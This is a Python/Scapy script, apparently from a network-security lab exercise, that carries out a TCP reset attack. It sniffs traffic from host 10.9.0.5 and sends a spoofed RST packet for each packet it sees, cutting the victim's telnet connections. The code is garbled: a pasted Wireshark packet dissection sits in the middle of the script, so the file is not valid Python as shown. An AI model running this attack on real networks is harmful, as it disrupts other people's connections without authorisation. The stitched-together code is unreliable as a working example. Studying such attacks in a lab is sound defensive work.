#!/usr/bin/python3
from scapy.all import *
from time import *

print("sniff-and-spoof ...")
print("wait")
sleep(5)
print("launching the attack ...")

IP_src = "10.9.0.5"
my_iface = 'br-8ff0bf6fedc6'
    Section number: 1
    Interface id: 0 (br-8ff0bf6fedc6)
        Interface name: br-8ff0bf6fedc6
    Encapsulation type: Ethernet (1)
    Arrival Time: Jan 24, 2025 13:28:21.336257015 KST
    UTC Arrival Time: Jan 24, 2025 04:28:21.336257015 UTC
    Epoch Arrival Time: 1737692901.336257015
    [Time shift for this packet: 0.000000000 seconds]
    [Time delta from previous captured frame: 0.000000000 seconds]
    [Time delta from previous displayed frame: 0.000000000 seconds]
    [Time since reference or first frame: 0.000000000 seconds]
    Frame Number: 1
    Frame Length: 67 bytes (536 bits)
    Capture Length: 67 bytes (536 bits)
    [Frame is marked: False]
    [Frame is ignored: False]
    [Protocols in frame: eth:ethertype:ip:tcp:telnet]
    [Coloring Rule Name: TCP]
    [Coloring Rule String: tcp]
Ethernet II, Src: 02:42:0a:09:00:05 (02:42:0a:09:00:05), Dst: 02:42:0a:09:00:06 (02:42:0a:09:00:06)
Internet Protocol Version 4, Src: 10.9.0.5, Dst: 10.9.0.6
Transmission Control Protocol, Src Port: 40970, Dst Port: 23, Seq: 3065481018, Ack: 1230385658, Len: 1
    Source Port: 40970
    Destination Port: 23
    [Stream index: 0]
    [Conversation completeness: Incomplete (12)]
    [TCP Segment Len: 1]
    Sequence Number: 3065481018
    [Next Sequence Number: 3065481019]
    Acknowledgment Number: 1230385658
    1000 .... = Header Length: 32 bytes (8)
    Flags: 0x018 (PSH, ACK)
    Window: 501
    [Calculated window size: 501]
    [Window size scaling factor: -1 (unknown)]
    Checksum: 0x1444 [unverified]
    [Checksum Status: Unverified]
    Urgent Pointer: 0
    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
    [Timestamps]
    [SEQ/ACK analysis]
    TCP payload (1 byte)
Telnet

my_filtering = 'tcp and src host {A}'.format(A=IP_src)

def spoof_tcp(pkt):
	IP_layer = IP( dst=IP_src, src=pkt[IP].dst )
	TCP_layer = TCP( flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport )
	spoof_pkt = IP_layer/TCP_layer
	send( spoof_pkt, verbose=0 )

pkt = sniff(iface=my_iface, filter=my_filtering, prn=spoof_tcp)
